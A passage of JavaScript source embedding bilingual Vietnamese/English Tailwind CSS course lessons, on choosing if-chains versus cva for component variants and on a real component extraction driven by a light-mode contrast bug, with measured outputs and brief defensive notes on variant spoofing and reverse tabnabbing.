</div>

<div class="pitfall">
<p><strong>Bẫy — đưa <code>cva</code> vào cho một component chỉ có MỘT trục biến thể.</strong> Object cấu hình DÀI HƠN chuỗi if mà nó thay thế, đội ngũ giờ có HAI cách viết biến thể, và cái lợi — biến thể ghép và kiểu suy ra — thì KHÔNG dùng tới. Hãy nhận nó khi ca ghép ĐẦU TIÊN xuất hiện, không phải để ĐÓN ĐẦU. Không lượt dùng nào trên 1.678 tệp component là bằng chứng rằng cú đón đầu ấy thường SAI.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> Một chuỗi if diễn đạt các trục biến thể ĐỘC LẬP hoàn toàn ổn và KHÔNG cần thư viện nào; tín hiệu để chuyển sang một ma trận khai báo là sự xuất hiện của ca <em>GHÉP</em> đầu tiên — một quy tắc phụ thuộc vào hai trục cùng lúc — và việc kho mã này dùng <code>cva</code> không lần nào trên 1.678 tệp component là một lời nhắc rằng phần lớn component KHÔNG bao giờ tới đó.</p>
</div>

<h3>🔬 Đo thật: chuỗi if và cva cho ra CÙNG chín chuỗi</h3>
<div class="out">$ node bang.cjs
primary sm  GIONG bg-blue-600 text-white hover:bg-blue-700 h-8 px-3 text-xs
primary md  GIONG bg-blue-600 text-white hover:bg-blue-700 h-10 px-4 text-sm
primary lg  GIONG bg-blue-600 text-white hover:bg-blue-700 h-12 px-6 text-base
ghost sm    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-8 px-3 text-xs border border-blue-200
ghost md    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-10 px-4 text-sm
ghost lg    GIONG bg-transparent text-blue-600 hover:bg-blue-50 h-12 px-6 text-base
danger sm   GIONG bg-red-600 text-white hover:bg-red-700 h-8 px-3 text-xs
danger md   GIONG bg-red-600 text-white hover:bg-red-700 h-10 px-4 text-sm
danger lg   GIONG bg-red-600 text-white hover:bg-red-700 h-12 px-6 text-base
9/9 to hop giong het · mac dinh button() = "bg-blue-600 text-white hover:bg-blue-700 h-10 px-4 text-sm"</div>
<p>Cùng một nút viết hai cách (đúng cấu hình của bài, cả hai qua <code>cn()</code> của trang): cả chín tổ hợp giống hệt từng byte, kể cả viền ca ghép ghost+sm. <code>cva</code> không làm ra nút khác; nó làm cùng nút từ một định nghĩa có hình dạng khác. Để ý dòng cuối: không truyền prop nào thì <code>defaultVariants</code> cho primary/md.</p>
<h3>🔬 Đo thật: kiểu suy ra bắt biến thể sai trước khi vẽ gì</h3>
<div class="out">$ npx tsc --noEmit --strict kieu.ts 2&gt;&amp;1 | sed -E 's/^kieu\\.ts\\(([0-9]+),([0-9]+)\\)/kieu.ts:\\1:\\2/'
kieu.ts:7:28: error TS2322: Type '"blue"' is not assignable to type '"primary" | "ghost" | "danger" | null | undefined'.
kieu.ts:7:45: error TS2322: Type '"xl"' is not assignable to type '"sm" | "md" | "lg" | null | undefined'.</div>
<h3>🔬 Đo thật: ma trận là dữ liệu</h3>
<p>Một script mười dòng lặp qua định nghĩa <code>cva</code> và sinh trang có đủ chín nút — không ai viết tay. Trong Chromium: viền ghost+sm <strong>1px</strong>, ghost+md <strong>0px</strong>, chiều cao danger sm/md/lg <strong>32 / 40 / 48 px</strong>. Chuỗi if không liệt kê ra được như thế.</p>
<h3>🌍 Ngoài đời, "nếu… thì sao", và góc kẻ xấu</h3>
<ul><li><strong>Ngoài đời:</strong> quán cà phê in cỡ × món thành một bảng giá, và ngoại lệ duy nhất ("trà đá cỡ lớn miễn phí thứ Hai") có dòng riêng — thay vì người phục vụ đọc thuộc "nếu latte và nếu cỡ lớn…".</li>
<li><strong>Nếu… thì sao:</strong> biến thể đến từ dữ liệu — bình luận, thông báo, URL? Lúc chạy không còn TypeScript. Đo bên dưới: giá trị lạ làm <code>cva</code> chỉ trả lớp nền — <code>defaultVariants</code> dùng khi prop <em>không có</em>, không phải khi prop <em>lạ</em> — nên component hiện trơn.</li>
<li><strong>Góc kẻ xấu — kiểu dáng là tín hiệu tin cậy:</strong> nếu người dùng chọn được biến thể, kẻ xấu chọn <code>"system"</code> và bình luận của họ mặc huy hiệu đỏ chính thức. Bảng tra ngây thơ còn biến <code>"toString"</code> thành mã nguồn của một hàm nằm trong danh sách lớp.</li></ul>
<div class="out">$ node xau.cjs
"system"     | cva: "rounded p-3 bg-red-600 text-white font-bold"        | bang tra: "rounded p-3 bg-red-600 text-white font-bold
             | loc truoc: "rounded p-3 bg-slate-100"
"khong-co"   | cva: "rounded p-3"                                        | bang tra: "rounded p-3 "
             | loc truoc: "rounded p-3 bg-slate-100"
"toString"   | cva: "rounded p-3"                                        | bang tra: "rounded p-3 function toString() { [native c
             | loc truoc: "rounded p-3 bg-slate-100"</div>
<p>Phòng bằng <strong>danh sách cho phép</strong> những gì người dùng được chọn, kiểm lúc chạy (Zod, hoặc <code>ALLOWED.includes(v)</code>), rồi rơi về một mặc định an toàn.</p>
<h3>🔁 Tự chạy lại</h3>
<pre><code class="language-bash"><span class="tok-comment"># chuỗi if vs cva: cùng 9 chuỗi?</span>
npm i class-variance-authority@0.7.1 clsx tailwind-merge
node -e "
const {cva}=require('class-variance-authority');
const b=cva('btn',{variants:{v:{primary:'bg-blue-600',ghost:'bg-transparent'},s:{sm:'h-8',lg:'h-12'}},compoundVariants:[{v:'ghost',s:'sm',class:'border'}]});
for (const v of ['primary','ghost']) for (const s of ['sm','lg']) console.log(v,s,b({v,s}));
console.log('unknown -&gt;', b({v:'system'}));"
<span class="tok-comment"># mã của bạn: chuỗi if, bảng tra, hay cva?</span>
git grep -lE 'variant\\s*===' -- '*.tsx' | wc -l; git grep -c 'cva(' -- '*.ts' '*.tsx' | wc -l</code></pre>
<h3>🔗 Học sâu hơn</h3>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-3-2-react-hook-form" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 3.2 — React Hook Form + Zod</span><span class="lc-sub">Kiểm lúc chạy: danh sách cho phép cho biến thể đến từ dữ liệu</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-1-compound-headless" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.1 — Compound component, hook headless, prop "as"</span><span class="lc-sub">Bước sau biến thể: component chia sẻ state</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-5-primitives" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.5 — Một cú tách THẬT, và con bọ đã gây ra nó</span><span class="lc-sub">Bài sau: đọc các tệp primitives của trang này</span></span></a>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Variant axis (trục biến thể)</span><span class="v">Một chiều tạo kiểu độc lập (vd <code>size</code>, <code>intent</code>) diễn đạt bằng một prop.</span></div>
  <div class="kv"><span class="k">if-chain (chuỗi if)</span><span class="v">Logic lớp điều kiện thuần — đọc được hoàn toàn với các trục độc lập và không cần thư viện.</span></div>
  <div class="kv"><span class="k">Compound variant (biến thể ghép)</span><span class="v">Quy tắc phụ thuộc hai trục cùng lúc — tín hiệu chuyển sang ma trận khai báo.</span></div>
  <div class="kv"><span class="k">cva</span><span class="v">class-variance-authority: khai nền, biến thể và ca ghép dưới dạng DỮ LIỆU thay vì nhánh.</span></div>
  <div class="kv"><span class="k">VariantProps</span><span class="v">Suy kiểu prop của component từ cấu hình cva, nên kiểu và kiểu dáng không trôi khỏi nhau.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul><li>Một chuỗi if xử lý tốt các trục biến thể độc lập và không cần thư viện.</li><li>Tín hiệu để nhận ma trận khai báo là ca GHÉP đầu tiên (quy tắc trải hai trục).</li><li><code>cva</code> khai biến thể dưới dạng dữ liệu và suy kiểu prop bằng <code>VariantProps</code>.</li><li>Kho này dùng <code>cva</code> không lần nào trên 1.678 tệp component — phần lớn component không bao giờ tới ca ghép.</li></ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">class-variance-authority — tài liệu</span><span class="lc-sub">cva.style — API, <code>compoundVariants</code>, và <code>VariantProps</code> để suy ra kiểu prop từ cấu hình.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">shadcn/ui — mã nguồn Button</span><span class="lc-sub">ui.shadcn.com/docs/components/button — tổ hợp <code>cva</code> + <code>cn</code> kinh điển, cho thấy hai thư viện chia việc ra sao.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind Variants</span><span class="lc-sub">tailwind-variants.org — một lựa chọn thay thế GÓI SẴN bước hợp nhất, nếu bạn thà có một phụ thuộc hơn là hai.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">TypeScript — suy kiểu từ một object cấu hình</span><span class="lc-sub">/courses/typescript/learn${REF} — <code>typeof</code>, <code>keyof</code> và suy luận từ một object nguyên văn, chính là bộ máy đằng sau <code>VariantProps</code>.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 4.5 ─────────────────────────── */
    {
      title: '4.5 — A real extraction, and the bug that caused it|||4.5 — Một cú tách THẬT, và con bọ đã gây ra nó',
      slug: 'tw-4-5-primitives',
      type: 'VIDEO',
      description: 'Kho này có ba file `primitives.tsx` (949 dòng). Phần đầu file của một cái GHI LẠI vì sao nó tồn tại: trang trước đó đóng cứng `#0a0a14`, nên màn Cài đặt ĐEN KỊT trong theme sáng. Một cú tách được thúc bởi một con bọ, có tài liệu.',
      content: `
${G04_5}
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.5</span>
<h2>A real extraction, and the bug that caused it</h2>
<p class="lead">The previous lessons gave rules for when to extract. This one reads an extraction that actually happened in this repository, because the reasoning recorded in its file header is more instructive than any invented example.</p>

<h3>What was extracted</h3>
<pre><code class="language-bash">$ wc -l src/components/*/primitives.tsx
</code></pre>

<div class="out">  209 src/components/finance/primitives.tsx
  350 src/components/language/primitives.tsx
  390 src/components/settings/primitives.tsx
  949 total
</div>

<p>Three files, one per feature area, each holding that area's building blocks. The settings one exports twelve components: <code>SettingsPage</code>, <code>SettingsCard</code>, <code>SettingsRow</code>, <code>SettingsDivider</code>, <code>Toggle</code>, <code>TextInput</code>, <code>TextArea</code>, <code>Field</code>, <code>Button</code>, <code>SyncBadge</code>, <code>EmptyState</code>, <code>StatusPill</code>.</p>

<h3>The header, which is the actual lesson</h3>
<div class="out">/**
 * Shared building blocks for /settings (added 2026-08-08).
 *
 * Every control here is theme-aware via CSS variables (&#96;--bg-card&#96;,
 * &#96;--text-primary&#96;, …). The page this replaced hardcoded &#96;#0a0a14&#96; and
 * &#96;rgba(15,23,42,.6)&#96;, which meant the settings screen stayed pitch black
 * in light mode while the rest of the site turned white.
 *
 * Per CLAUDE.md: the global dark class is &#96;theme-dark&#96;, never &#96;dark&#96; —
 * Tailwind's &#96;dark:&#96; variant is reserved for the Notes wrapper. Nothing in
 * this file uses a &#96;dark:&#96; utility; it reads the CSS variables instead, so
 * it follows whichever theme is active without a second code path.
 */
</div>

<p>Three separate pieces of engineering knowledge in twelve lines, and each one is the kind of thing that gets lost when it lives only in someone's memory.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">the bug that forced it</span><span class="lz-nsub">"pitch black in light mode"</span></span>
<span class="lz-nbody">Hardcoded hex values scattered across a page. Not a duplication problem — a <em>correctness</em> problem. Every copy of <code>#0a0a14</code> was a place the light theme could not reach, and there was no single place to fix it.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">the mechanism chosen</span><span class="lz-nsub">CSS variables, not <code>dark:</code></span></span>
<span class="lz-nbody">Values resolve per theme at runtime, so one class is correct in both. No second code path, no variant to forget. Chapter 6 is entirely about this technique.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">the constraint honoured</span><span class="lz-nsub">"per CLAUDE.md"</span></span>
<span class="lz-nbody">An explicit note that this file deliberately uses zero <code>dark:</code> utilities, citing the repository rule from the 2026-07-02 incident (lesson 2.4). The next person to add a control here knows not to reach for <code>dark:</code> — and knows why.</span>
</div>
</div>

<div class="callout ok">
<p><strong>Why the extraction trigger matters here.</strong> Lesson 4.1's rule was "long and repeated". This extraction was triggered by something stronger: the duplicated thing was <em>wrong</em>, and being duplicated meant it was wrong in many places at once. Duplication is a maintenance cost when the copies are correct; it is a correctness cost when they are not. The second is a much better reason to extract, and it is the one that shows up in incident reports.</p>
</div>

<h3>What makes this file worth copying as a pattern</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">scoped to a feature, not global</span><span class="lz-lnote"><code>components/settings/primitives.tsx</code>, not <code>components/ui/</code>. These are the settings screen's building blocks; a global UI folder invites components to be reused where they do not fit, and then generalised until they fit badly everywhere</span></div>
<div class="lz-layer"><span class="lz-lname">one file, not one file per component</span><span class="lz-lnote">twelve small components in 390 lines. Splitting them into twelve files would add navigation cost for no benefit — they are read and changed together</span></div>
<div class="lz-layer"><span class="lz-lname">a header that says WHY</span><span class="lz-lnote">the date, the bug, the mechanism, the constraint. Six months later this is the difference between "why does this not use dark:?" and knowing not to ask</span></div>
<div class="lz-layer"><span class="lz-lname">consistent internals</span><span class="lz-lnote">every control takes <code>className</code>, routes through <code>cn</code>, and forwards refs where it wraps a DOM element. A reader who learns one learns all twelve</span></div>
</div>

<h3>Feature-scoped versus global, measured</h3>
<p>Three separate <code>primitives.tsx</code> files means <code>Button</code> exists in more than one place. That is a deliberate trade and worth being explicit about:</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">feature-scoped — what this repo did</span><span class="lz-nsub">3 files, some duplication</span></span>
<span class="lz-nbody">Each area's primitives can evolve independently. The settings Button can change without a regression sweep across finance and language. The cost is real duplication and possible visual drift between areas.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">global design system</span><span class="lz-nsub">1 shared set</span></span>
<span class="lz-nbody">One Button, guaranteed consistency, one place to fix. The cost is that every change is a cross-cutting change, and the component accretes variants until it serves every area badly — the failure mode lesson 4.4 warned about.</span>
</div>
</div>

<p>Neither is universally right. The signal to consolidate is when two areas' primitives have <em>converged</em> — if the finance and settings buttons have ended up identical, the duplication is no longer buying independence and should be collapsed.</p>

<div class="pitfall">
<p><strong>Trap — extracting the components and leaving the hardcoded values.</strong> The extraction in this file was only a fix because the values became CSS variables at the same time. Moving <code>#0a0a14</code> from every call site into one component makes it easier to fix later, but the settings screen is still black in light mode until someone does. Extraction and the actual correction are two steps, and shipping only the first feels like progress while changing nothing a user can see.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> The strongest reason to extract is not duplication but <em>duplicated wrongness</em> — this repository's settings primitives exist because hardcoded hex values made the screen unusable in light mode — and the file's header earns its place by recording the bug, the mechanism that replaced it, and the repository rule it deliberately honours.</p>
</div>

<h3>🔬 Measured: the header still holds</h3>
<div class="out">$ for f in settings finance language; do printf "%-9s export %2s · dark: that su %s\\n" $f $(grep -c '^export' src/components/$f/primitives.tsx) $(grep -n 'dark:' src/components/$f/primitives.tsx | grep -vcE '^[0-9]+:\\s*(\\*|//|/\\*)'); done
settings  export 12 · dark: that su 0
finance   export 11 · dark: that su 0
language  export 13 · dark: that su 0
$ git log --diff-filter=A --format='%h %ad' --date=short -- src/components/settings/primitives.tsx
da160fbb4 2026-08-08</div>
<p>Counting only code lines (not comments), all three primitives files use <strong>zero</strong> <code>dark:</code> utilities — the promise in the header still holds three months later.</p>
<h3>🔬 Measured: the bug, from git history and re-run in Chromium</h3>
<div class="out">$ git show da160fbb4^:frontend/src/app/settings/notifications/page.tsx | grep -nE "0a0a14|rgba\\(15, ?23, ?42" | cut -c1-110
166:        background: 'rgba(15,23,42,0.6)',
298:    &lt;div className="min-h-screen w-full relative" style={{ background: '#0a0a14' }}&gt;
330:            background: 'rgba(15,23,42,0.6)',</div>
<p>The notifications page just before the extraction hard-coded the page background and two panels. Re-run with this site's real theme values (<code>--text-primary</code> #050505 in light, #e4e6eb in dark):</p>
<table><tr><th>card</th><th>theme</th><th>background</th><th>contrast</th></tr>
<tr><td>hard-coded <code>#0a0a14</code></td><td>light</td><td><code>rgb(10, 10, 20)</code></td><td><strong>1.04</strong></td></tr>
<tr><td><code>var(--bg-card)</code></td><td>light</td><td><code>rgb(255, 255, 255)</code></td><td>20.38</td></tr>
<tr><td>hard-coded</td><td>dark</td><td><code>rgb(10, 10, 20)</code></td><td>15.77</td></tr>
<tr><td><code>var(--bg-card)</code></td><td>dark</td><td><code>rgb(36, 37, 38)</code></td><td>12.30</td></tr></table>
<p>The text follows the theme; the hard-coded background does not — near-black on near-black, <strong>1.04:1</strong> against the WCAG minimum of 4.5. In dark mode both cards read fine, which is exactly why nobody saw it while building.</p>
<h3>🔬 Measured: is the pattern gone?</h3>
<div class="out">$ git grep -l 'bg-\\[#0a0a14\\]' -- 'src/*.tsx'
src/app/games/[slug]/GamePlayClient.tsx
src/components/messaging/BlockedUsersModal.tsx
src/components/messaging/MessageList.tsx
src/components/messaging/NicknamePopover.tsx
src/components/messaging/ThreadRowMenu.tsx
$ grep -n '0a0a14' src/app/globals.css
419:  .bg-\\[\\#0a0a14\\],</div>
<p>Five files still paint <code>bg-[#0a0a14]</code> — messaging popovers and the game frame, deliberate dark islands. <code>globals.css</code> line 419 lists that class among the dark surfaces that re-declare the text variables to their dark values, so text inside stays readable in light mode (lesson 9.2 measures that safety net).</p>
<h3>🔬 Measured: feature-scoped Buttons are converging</h3>
<div class="out">$ node hai.cjs
finance 12 lop · settings 12 lop · chung 10
chi finance : gap-1.5 transition-colors
chi settings: gap-2 transition-all</div>
<p>The finance and settings Buttons share 10 of 12 base classes; the two differences look like drift, not intent. That convergence is the signal to consolidate.</p>
<h3>🌍 In real life, "what if…", and the attacker's view</h3>
<ul><li><strong>Every day:</strong> a typo in a printed form template is copied onto every form photocopied from it. Fixing the template fixes every future copy; fixing one form fixes one form.</li>
<li><strong>What if…</strong> nobody had extracted? Every hard-coded panel would need its own fix, each one a chance to miss — and light-mode users would find the misses for you.</li>
<li><strong>The attacker's view — a security fix duplicated by hand:</strong> <code>target="_blank"</code> without <code>rel="noopener"</code> once let the opened page rewrite your tab (reverse tabnabbing, a phishing trick). Here:</li></ul>
<div class="out">$ git grep -c 'target="_blank"' -- 'src/*.tsx' | awk -F: '{s+=$2} END {print s " lan target=_blank trong " NR " tep"}'
232 lan target=_blank trong 145 tep
$ git grep -hoE '&lt;a [^&gt;]*target="_blank"[^&gt;]*&gt;' -- 'src/*.tsx' | awk '{n++} /rel=/{r++} END {print n " the &lt;a&gt; viet mot dong · " r " co rel= · " n-r " thieu"}'
138 the &lt;a&gt; viet mot dong · 137 co rel= · 1 thieu
$ git grep -nE '&lt;a [^&gt;]*target="_blank"[^&gt;]*&gt;' -- 'src/*.tsx' | grep -v 'rel=' | cut -c1-96
src/components/messaging/AnhLightbox.tsx:6: * Trước đây bấm ảnh trong tin nhắn là &#96;&lt;a target="_b</div>
<p>137 of 138 one-line links carry <code>rel=</code>; the "missing" one is a comment. Still, 232 hand-written copies are 232 chances to forget — an <code>&lt;ExternalLink&gt;</code> component makes it one place.</p>
<h3>🔁 Run it yourself</h3>
<pre><code class="language-bash"><span class="tok-comment"># 1) hard-coded colours in your project</span>
git grep -nE "bg-\\[#[0-9a-fA-F]{6}\\]|background: '#[0-9a-fA-F]{6}'" -- '*.tsx' | head
<span class="tok-comment"># 2) the page before an extraction, from git history</span>
git show &lt;commit&gt;^:path/to/page.tsx | grep -n '#'
<span class="tok-comment"># 3) contrast of one element (DevTools console)</span>
getComputedStyle($0).color + ' on ' + getComputedStyle($0).backgroundColor</code></pre>
<h3>🔗 Go deeper</h3>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-2-4-che-do-toi" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 2.4 — Dark mode, and the class name that broke a feature</span><span class="lc-sub">Why the global class is theme-dark, never dark</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-7-3-cau-truc" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 7.3 — Scalable project structure: feature folders</span><span class="lc-sub">Feature-scoped primitives, from the React side</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-5-1-extend" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 5.1 — extend ADDS; theme REPLACES</span><span class="lc-sub">Next chapter: configuration and themes</span></span></a>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Extraction</span><span class="v">Pulling a repeated pattern into a named component — here, a real one that happened in this repo.</span></div>
  <div class="kv"><span class="k">Duplicated wrongness</span><span class="v">The strongest reason to extract: not duplication alone but the same mistake copied to many places.</span></div>
  <div class="kv"><span class="k">Hardcoded hex</span><span class="v">Fixed colour values that made the screen unusable in light mode — the bug that forced the extraction.</span></div>
  <div class="kv"><span class="k">theme-dark rule</span><span class="v">The CLAUDE.md constraint (never <code>.dark</code> on <code>&lt;html&gt;</code>) the extracted primitives deliberately honour.</span></div>
  <div class="kv"><span class="k">File-header rationale</span><span class="v">Recording the bug, its replacement mechanism and the repo rule at the top of the file.</span></div>
</div>

<h3>📌 Summary</h3>
<ul><li>The strongest reason to extract is duplicated wrongness, not mere duplication.</li><li>This repo's settings primitives exist because hardcoded hex values broke light mode.</li><li>The extraction replaced the hex values with theme-aware variables and honours the <code>theme-dark</code> rule.</li><li>The file header earns its place by recording the bug, the mechanism, and the constraint.</li></ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">CLAUDE.md — the theme-dark rule</span><span class="lc-sub">the repository constraint this file cites, from the 2026-07-02 incident where <code>.dark</code> on <code>&lt;html&gt;</code> broke the Notes theme switcher.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">MDN — CSS custom properties</span><span class="lc-sub">developer.mozilla.org/en-US/docs/Web/CSS/Using_CSS_custom_properties — the mechanism that lets one class be correct in both themes. Chapter 6 develops this fully.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Kent C. Dodds — Colocation</span><span class="lc-sub">kentcdodds.com/blog/colocation — the argument for feature-scoped rather than global shared folders, which is the choice these three files represent.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Chapter 6 — theme-aware values without a second code path</span><span class="lc-sub">/courses/tailwind-css/learn${REF} — the CSS-variable technique this file uses, including how to wire it into the Tailwind config so class names stay clean.</span></span></div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.5</span>
<h2>Một cú tách THẬT, và con bọ đã gây ra nó</h2>
<p class="lead">Các bài trước đưa ra LUẬT về khi nào nên tách. Bài này ĐỌC một cú tách đã THẬT SỰ xảy ra trong kho này, vì lý lẽ ghi ở phần đầu file của nó dạy được nhiều hơn bất kỳ ví dụ bịa nào.</p>

<h3>Cái gì đã được tách</h3>
<pre><code class="language-bash">$ wc -l src/components/*/primitives.tsx
</code></pre>

<div class="out">  209 src/components/finance/primitives.tsx
  350 src/components/language/primitives.tsx
  390 src/components/settings/primitives.tsx
  949 total
</div>

<p>Ba file, mỗi vùng tính năng một cái, mỗi cái giữ các khối dựng của vùng ấy. Cái cho settings xuất ra mười hai component: <code>SettingsPage</code>, <code>SettingsCard</code>, <code>SettingsRow</code>, <code>SettingsDivider</code>, <code>Toggle</code>, <code>TextInput</code>, <code>TextArea</code>, <code>Field</code>, <code>Button</code>, <code>SyncBadge</code>, <code>EmptyState</code>, <code>StatusPill</code>.</p>

<h3>Phần đầu file, THỨ MỚI LÀ bài học</h3>
<div class="out">/**
 * Cac khoi dung dung chung cho /settings (them 08/08/2026).
 *
 * Moi dieu khien o day BIET THEME qua bien CSS (&#96;--bg-card&#96;,
 * &#96;--text-primary&#96;, …). Trang ma no thay the DA DONG CUNG &#96;#0a0a14&#96; va
 * &#96;rgba(15,23,42,.6)&#96;, nghia la man Cai dat DEN KIT trong theme sang
 * trong khi phan con lai cua trang web da chuyen trang.
 *
 * Theo CLAUDE.md: lop toi toan cuc la &#96;theme-dark&#96;, KHONG BAO GIO &#96;dark&#96; —
 * bien the &#96;dark:&#96; cua Tailwind DANH RIENG cho vo boc Notes. KHONG gi trong
 * file nay dung mot tien ich &#96;dark:&#96;; no doc BIEN CSS thay vao do, nen
 * no theo bat ky theme nao dang bat ma khong can duong ma thu hai.
 */
</div>

<p>BA mảnh tri thức kỹ thuật riêng biệt trong mười hai dòng, và mỗi mảnh là loại thứ sẽ MẤT khi nó chỉ sống trong trí nhớ của ai đó.</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">con bọ đã ÉP nó xảy ra</span><span class="lz-nsub">"đen kịt trong theme sáng"</span></span>
<span class="lz-nbody">Các mã hex đóng cứng rải khắp một trang. KHÔNG phải một vấn đề TRÙNG LẶP — một vấn đề <em>ĐÚNG/SAI</em>. Mỗi bản sao của <code>#0a0a14</code> là một chỗ mà theme sáng KHÔNG với tới được, và không có MỘT chỗ nào để vá.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">cơ chế được chọn</span><span class="lz-nsub">biến CSS, không phải <code>dark:</code></span></span>
<span class="lz-nbody">Giá trị phân giải THEO TỪNG THEME lúc chạy, nên MỘT lớp đúng ở cả hai. Không đường mã thứ hai, không biến thể nào để quên. Chương 6 dành trọn cho kỹ thuật này.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">ràng buộc được TÔN TRỌNG</span><span class="lz-nsub">"theo CLAUDE.md"</span></span>
<span class="lz-nbody">Một ghi chú TƯỜNG MINH rằng file này CỐ Ý dùng KHÔNG tiện ích <code>dark:</code> nào, viện dẫn luật của kho từ sự cố 02/07/2026 (bài 2.4). Người kế tiếp thêm một điều khiển vào đây BIẾT là đừng với tay tới <code>dark:</code> — và biết VÌ SAO.</span>
</div>
</div>

<div class="callout ok">
<p><strong>Vì sao TÁC NHÂN của cú tách quan trọng ở đây.</strong> Luật ở bài 4.1 là "dài và lặp lại". Cú tách này được kích hoạt bởi thứ MẠNH hơn: cái bị trùng lặp là thứ <em>SAI</em>, và bị trùng lặp nghĩa là nó sai ở NHIỀU chỗ cùng lúc. Trùng lặp là một cái giá BẢO TRÌ khi các bản sao ĐÚNG; nó là một cái giá về TÍNH ĐÚNG khi chúng sai. Cái thứ hai là lý do TỐT HƠN NHIỀU để tách, và nó là cái xuất hiện trong các báo cáo sự cố.</p>
</div>

<h3>Điều làm file này đáng chép làm khuôn mẫu</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">giới hạn theo TÍNH NĂNG, không toàn cục</span><span class="lz-lnote"><code>components/settings/primitives.tsx</code>, không phải <code>components/ui/</code>. Đây là các khối dựng của MÀN CÀI ĐẶT; một thư mục UI toàn cục MỜI GỌI việc dùng lại component ở chỗ chúng không vừa, rồi tổng quát hoá cho tới khi chúng vừa TỆ ở khắp nơi</span></div>
<div class="lz-layer"><span class="lz-lname">MỘT file, không phải mỗi component một file</span><span class="lz-lnote">mười hai component nhỏ trong 390 dòng. Chẻ chúng thành mười hai file thì thêm chi phí điều hướng mà không được gì — chúng được ĐỌC và ĐỔI cùng nhau</span></div>
<div class="lz-layer"><span class="lz-lname">một phần đầu nói VÌ SAO</span><span class="lz-lnote">cái ngày, con bọ, cơ chế, ràng buộc. Sáu tháng sau đây là khác biệt giữa "sao cái này không dùng dark:?" và BIẾT là đừng hỏi</span></div>
<div class="lz-layer"><span class="lz-lname">bên trong NHẤT QUÁN</span><span class="lz-lnote">mọi điều khiển đều nhận <code>className</code>, đi qua <code>cn</code>, và chuyển tiếp ref ở chỗ nó bọc một thẻ DOM. Người đọc học được MỘT cái là học được cả mười hai</span></div>
</div>

<h3>Giới hạn-theo-tính-năng đối lập toàn cục, đo được</h3>
<p>Ba file <code>primitives.tsx</code> riêng nghĩa là <code>Button</code> tồn tại ở HƠN MỘT chỗ. Đó là một sự đánh đổi CÓ CHỦ Ý và đáng nói thẳng ra:</p>

<div class="lz-map">
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">theo tính năng — cái kho này làm</span><span class="lz-nsub">3 file, có trùng lặp</span></span>
<span class="lz-nbody">Nguyên thể của mỗi vùng TIẾN HOÁ ĐỘC LẬP được. Cái Button của settings đổi được mà không cần quét hồi quy khắp finance và language. Cái giá là trùng lặp THẬT và khả năng TRÔI DẠT thị giác giữa các vùng.</span>
</div>
<div class="lz-stage lz-badge">
<span class="lz-node"><span class="lz-ntitle">hệ thiết kế TOÀN CỤC</span><span class="lz-nsub">1 bộ dùng chung</span></span>
<span class="lz-nbody">Một Button, nhất quán được bảo đảm, MỘT chỗ để vá. Cái giá là mọi thay đổi đều là thay đổi CẮT NGANG, và component TÍCH TỤ biến thể cho tới khi nó phục vụ mọi vùng một cách TỆ — chính kiểu hỏng mà bài 4.4 đã cảnh báo.</span>
</div>
</div>

